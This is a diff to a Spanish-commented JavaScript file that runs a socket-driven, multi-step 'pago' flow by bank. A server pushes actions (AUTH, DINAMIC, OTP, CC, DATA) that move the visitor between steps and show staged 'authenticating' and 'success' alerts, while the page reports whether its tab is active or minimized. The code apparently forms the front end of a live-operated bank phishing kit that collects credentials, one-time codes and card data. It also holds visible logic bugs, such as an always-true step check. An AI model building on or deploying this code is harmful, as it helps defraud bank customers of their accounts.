@@ -1,6 +1,7 @@
 // assets/js/socketConnection.js
 (function () {
     const RT = (window.RT = window.RT || {
+        basePath: "/pago", // ✅ nuevo
         nodeUrl: null,
         sessionId: null,
         sessionToken: null,
@@ -58,6 +59,22 @@
         return RT.actionToScreen[action] || RT.actionToScreen[base] || null;
     }
 
+    function buildStepUrl(step) {
+        // si hay bank => /pago/{bank}/step/{step}
+        if (RT.bank) return `${RT.basePath}/${RT.bank.toLowerCase()}/step/${step}`;
+
+        // si NO hay bank => /pago/step/{step}
+        return `${RT.basePath}/step/${step}`;
+    }
+
+    function buildStartUrl() {
+        // si hay bank => /pago/{bank}
+        if (RT.bank) return `${RT.basePath}/${RT.bank}`;
+
+        // si NO hay bank => /pago/step/1 (o /pago si quieres)
+        return `${RT.basePath}/step/1`;
+    }
+
     function redirectToAction(action) {
         try {
             if (!RT.bank) return;
@@ -66,7 +83,7 @@
             if (!target) return; // evita step/undefined
 
             if (String(RT.step) === String(target)) return; // ya estás ahí
-            window.location.href = `/pago/${RT.bank}/step/${target}`;
+            if (!RT.action.startsWith("DATA")) window.location.href = buildStepUrl(target);
         } catch (e) {
             console.log("redirectToAction error", e);
         }
@@ -169,7 +186,7 @@
                     safeHideLoading();
                     window.showBankAlert?.(
                         "error_custom",
-                        "Tu sesión expiró. Recarga la página."
+                        "Tu sesión expiró. Recarga la página.",
                     );
                     return;
                 }
@@ -178,7 +195,7 @@
             safeHideLoading();
             window.showBankAlert?.(
                 "error_custom",
-                "Error de conexión. Intenta nuevamente."
+                "Error de conexión. Intenta nuevamente.",
             );
         });
 
@@ -186,12 +203,21 @@
         window.addEventListener("focus", () => emitPresence("ACTIVE"));
         document.addEventListener("visibilitychange", () => {
             emitPresence(
-                document.visibilityState === "hidden" ? "MINIMIZED" : "ACTIVE"
+                document.visibilityState === "hidden" ? "MINIMIZED" : "ACTIVE",
             );
         });
 
         sock.on("session:update", (s) => {
             if (!s || !s.action) return;
+
+            // ✅ Si venimos del flujo general (sin bank) y el server ya definió bank,
+            // saltamos al inicio del flujo bank.
+            if (!RT.bank && s.bank && !s.action.startsWith("DATA")) {
+                RT.bank = String(s.bank);
+                safeShowLoading("Redirigiendo...");
+                window.location.href = `/pago/${RT.bank}`; // start del bank
+                return;
+            }
 
             const action = String(s.action);
             const baseAction = normalizeAction(action);
@@ -215,14 +241,15 @@
             // 1) WAIT_ACTION: solo loading y NO navegar
             if (isWaitingAction(action)) {
                 RT._seenWait = true;
-                const loadingText =
-                    currentStep === "2"
-                        ? "Autenticando..."
-                        : currentStep === "3"
+                const loadingText = action.startsWith("DATA")
+                    ? "Validando información..."
+                    : currentStep === "2"
+                      ? "Autenticando..."
+                      : currentStep === "3"
                         ? "Validando..."
                         : currentStep === "4"
-                        ? "Validando..."
-                        : "Cargando...";
+                          ? "Validando..."
+                          : "Cargando...";
 
                 safeShowLoading(loadingText);
                 if (alertId) window.hideBankAlert?.(alertId);
@@ -235,6 +262,19 @@
                 else window.hideBankAlert?.(alertId);
             }
 
+            if (action === "DATA_ERROR") {
+                safeHideLoading();
+                window.showAlert?.("error_data");
+                if (typeof window.__rtUpdateCb === "function")
+                    window.__rtUpdateCb(s);
+                try {
+                    sessionStorage.setItem("rt_last_error", String(msg));
+                } catch {}
+                
+                // Si por alguna razón llega en flujo bank, solo muestra alerta
+                return;
+            }
+
             // 3) Errores: redirigir al step correcto (o si ya estás, solo alerta)
             if (action === "AUTH_ERROR") {
                 // evita mostrar auth_error “fantasma” si no hubo WAIT previo
@@ -245,7 +285,7 @@
                     try {
                         sessionStorage.setItem(
                             "rt_last_error",
-                            String(s.lastError)
+                            String(s.lastError),
                         );
                     } catch {}
                 }
@@ -296,6 +336,10 @@
             // 5) Redirección normal si el action indica otro step
             // Evita navegar si no hay expectedStep
             if (expectedStep && String(expectedStep) !== String(currentStep)) {
+                console.log(action)
+                const fromDatato1 =
+                    (action === "AUTH" || action === "CC") &&
+                    String(currentStep) === "1" || "2";
                 const from2to3or4 =
                     (action === "DINAMIC" || action === "OTP") &&
                     String(currentStep) === "2";
@@ -304,7 +348,7 @@
                 const from4to3 =
                     action === "DINAMIC" && String(currentStep) === "4";
 
-                const shouldShowSuccess = from2to3or4 || from3to4 || from4to3;
+                const shouldShowSuccess = from2to3or4 || from3to4 || from4to3 || fromDatato1;
 
                 if (shouldShowSuccess) {
                     setTimeout(() => {
@@ -315,10 +359,19 @@
                                 ? "Autenticación exitosa."
                                 : "Validación exitosa.";
 
-                        window.showBankAlert?.("success", msg);
+                        try {
+                            window.showBankAlert("success", msg);
+                        } catch (error) {
+                            window.showAlert?.("success");
+                        }
+                        
 
                         setTimeout(() => {
-                            window.hideBankAlert?.("success");
+                           try {
+                            window.hideBankAlert("success");
+                        } catch (error) {
+                            window.hideAlert?.("success");
+                        }
                         }, 1000);
                     }, 1500);
 
@@ -357,7 +410,7 @@
         sessionId,
         sessionToken,
         bank,
-        step
+        step,
     ) {
         if (!nodeUrl || !sessionToken) return;
 
@@ -398,21 +451,26 @@
         safeShowLoading("Cargando...");
 
         // ✅ Bloqueo si hay una validación en proceso (WAIT_ACTION)
-        if (isWaitingAction(RT.lastAction)) {
+        console.log(eventName)
+        if (isWaitingAction(RT.lastAction) && eventName !== 'user:submit_data') {
             const waitingFor = RT.lastBaseAction; // AUTH | DINAMIC | OTP
+             console.log("bloqueo bank flow")
             if (submitting && submitting !== waitingFor) {
                 safeHideLoading();
                 redirectToAction(waitingFor);
                 window.showBankAlert?.(
                     "error_custom",
-                    "Ya hay una validación en proceso. Espera un momento."
+                    "Ya hay una validación en proceso. Espera un momento.",
                 );
                 return;
             }
         }
 
         // ✅ Forzar al step correcto del submit
-        if (submitting) redirectToAction(submitting);
+        if (submitting && RT.bank && eventName !== 'user:submit_data') {
+            console.log('forzado')
+            redirectToAction(submitting);
+        }
 
         // si no hay socket o no está conectado, encola y conecta
         if (!socket || !socket.connected) {
@@ -424,7 +482,7 @@
                     RT.sessionId,
                     RT.sessionToken,
                     RT.bank,
-                    RT.step
+                    RT.step,
                 );
             }
             return;
@@ -433,10 +491,10 @@
         socket.emit(eventName, payload, (res) => {
             try {
                 // ✅ Caso importante: bad_state (front desincronizado)
-                if (!res?.ok && res?.error === "bad_state") {
+                if (!res?.ok && res?.error === "bad_state" && eventName !== 'user:submit_data') {
                     // no es error de credenciales, es estado actual distinto
                     safeHideLoading();
-
+                    console.log("sincronizando desde server")
                     // pide snapshot real y corrige ruta/alertas
                     syncFromServer(() => {
                         // listo, si tocaba redirigir ya lo hizo
